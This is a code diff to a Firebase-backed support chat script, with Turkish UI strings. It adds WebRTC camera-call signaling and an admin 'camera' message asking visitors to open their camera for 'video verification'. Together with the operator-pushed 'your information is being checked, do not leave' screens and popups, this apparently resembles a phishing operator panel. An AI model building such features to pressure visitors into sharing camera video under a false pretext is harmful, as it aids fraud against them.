@@ -5,12 +5,20 @@ import {
   push,
   set,
   update,
+  remove,
   onChildAdded,
   onValue,
   query,
   orderByChild,
   limitToLast,
 } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+
+const ICE_SERVERS = {
+  iceServers: [
+    { urls: "stun:stun.l.google.com:19302" },
+    { urls: "stun:stun1.l.google.com:19302" },
+  ],
+};
 
 const cfg = window.FIREBASE_SYNC || {};
 const configured =
@@ -102,19 +110,94 @@ async function pushMessage(who, text) {
   return true;
 }
 
+function webrtcPath(sessionIdValue, callId, ...parts) {
+  return ["chats", sessionIdValue, "webrtc", callId, ...parts].filter(Boolean).join("/");
+}
+
+async function initCameraCall(targetSessionId, callId) {
+  const database = initDb();
+  if (!database) throw new Error("Firebase bağlı değil");
+  await set(ref(database, webrtcPath(targetSessionId, callId)), {
+    status: "requested",
+    createdAt: Date.now(),
+    updatedAt: Date.now(),
+  });
+}
+
+async function setCameraCallStatus(targetSessionId, callId, status) {
+  const database = initDb();
+  if (!database) return false;
+  await update(ref(database, webrtcPath(targetSessionId, callId)), {
+    status,
+    updatedAt: Date.now(),
+  });
+  return true;
+}
+
+async function writeCameraSignal(targetSessionId, callId, key, value) {
+  const database = initDb();
+  if (!database) throw new Error("Firebase bağlı değil");
+  await update(ref(database, webrtcPath(targetSessionId, callId)), {
+    [key]: value,
+    updatedAt: Date.now(),
+  });
+}
+
+async function pushIceCandidate(targetSessionId, callId, side, candidate) {
+  const database = initDb();
+  if (!database || !candidate) return false;
+  const listRef = push(ref(database, webrtcPath(targetSessionId, callId, `${side}Candidates`)));
+  await set(listRef, candidate);
+  return true;
+}
+
+function listenCameraCall(sessionIdValue, callId, onUpdate) {
+  const database = initDb();
+  if (!database || !sessionIdValue || !callId) return () => {};
+  return onValue(ref(database, webrtcPath(sessionIdValue, callId)), (snap) => {
+    onUpdate(snap.val() || null);
+  });
+}
+
+function listenIceCandidates(sessionIdValue, callId, side, onCandidate) {
+  const database = initDb();
+  if (!database || !sessionIdValue || !callId) return () => {};
+  return onChildAdded(
+    ref(database, webrtcPath(sessionIdValue, callId, `${side}Candidates`)),
+    (snap) => {
+      onCandidate(snap.val());
+    }
+  );
+}
+
+async function clearCameraCall(targetSessionId, callId) {
+  const database = initDb();
+  if (!database || !targetSessionId || !callId) return false;
+  await remove(ref(database, webrtcPath(targetSessionId, callId)));
+  return true;
+}
+
 async function sendAdminMessage(targetSessionId, text, options = {}) {
   const database = initDb();
   if (!database) throw new Error("Firebase bağlı değil");
   if (!targetSessionId) throw new Error("Sohbet seçili değil");
   const kind =
-    options.type === "loading" ? "loading" : options.type === "popup" ? "popup" : "text";
+    options.type === "loading"
+      ? "loading"
+      : options.type === "popup"
+        ? "popup"
+        : options.type === "camera"
+          ? "camera"
+          : "text";
   const clean = String(
     text ||
       (kind === "loading"
         ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
         : kind === "popup"
           ? "Devam etmek için onaylayın."
-          : "")
+          : kind === "camera"
+            ? "Görüntülü doğrulama için kameranızı açmanız isteniyor. İzin verirseniz görüntü yalnızca bu destek oturumuna bağlanır."
+            : "")
   )
     .trim()
     .slice(0, 800);
@@ -122,6 +205,10 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
 
   const okLabel = String(options.okLabel || "Tamam").trim().slice(0, 40) || "Tamam";
   const cancelLabel = String(options.cancelLabel || "İptal").trim().slice(0, 40) || "İptal";
+  const callId =
+    kind === "camera"
+      ? String(options.callId || makeId()).slice(0, 64)
+      : null;
 
   // who:"bot" + from:"admin" → eski Rules (yalnızca user/bot) ile de uyumlu
   const msgRef = push(ref(database, `chats/${targetSessionId}/messages`));
@@ -131,7 +218,7 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
     text: clean,
     ts: Date.now(),
   };
-  if (kind === "loading" || kind === "popup") payload.type = kind;
+  if (kind === "loading" || kind === "popup" || kind === "camera") payload.type = kind;
   if (kind === "popup") {
     payload.from = "admin";
     payload.okLabel = okLabel;
@@ -142,6 +229,13 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
       .trim()
       .slice(0, 120);
   }
+  if (kind === "camera") {
+    payload.callId = callId;
+    payload.okLabel = String(options.okLabel || "Kamerayı aç").trim().slice(0, 40) || "Kamerayı aç";
+    payload.cancelLabel =
+      String(options.cancelLabel || "Reddet").trim().slice(0, 40) || "Reddet";
+    await initCameraCall(targetSessionId, callId);
+  }
 
   await set(msgRef, payload);
   await update(ref(database, `chats/${targetSessionId}`), {
@@ -151,10 +245,12 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
         ? "⏳ Kontrol ediliyor…"
         : kind === "popup"
           ? `Popup: ${clean.slice(0, 100)}`
-          : clean.slice(0, 120),
+          : kind === "camera"
+            ? "📷 Kamera talebi"
+            : clean.slice(0, 120),
     lastWho: "admin",
   });
-  return true;
+  return { callId };
 }
 
 function checkAdminPassword(password) {
@@ -222,12 +318,21 @@ window.ChatSync = {
   enabled: configured,
   needsSetup: !configured,
   adminPasswordHintSet: Boolean(cfg.adminPassword && cfg.adminPassword !== "degistir-bu-sifreyi"),
+  ICE_SERVERS,
+  getSessionId,
   pushMessage,
   sendAdminMessage,
   checkAdminPassword,
   listenSessions,
   listenMessages,
   listenIncomingSupport,
+  initCameraCall,
+  setCameraCallStatus,
+  writeCameraSignal,
+  pushIceCandidate,
+  listenCameraCall,
+  listenIceCandidates,
+  clearCameraCall,
   getQuickReplies,
   setQuickReplies,
   DEFAULT_QUICK_REPLIES,
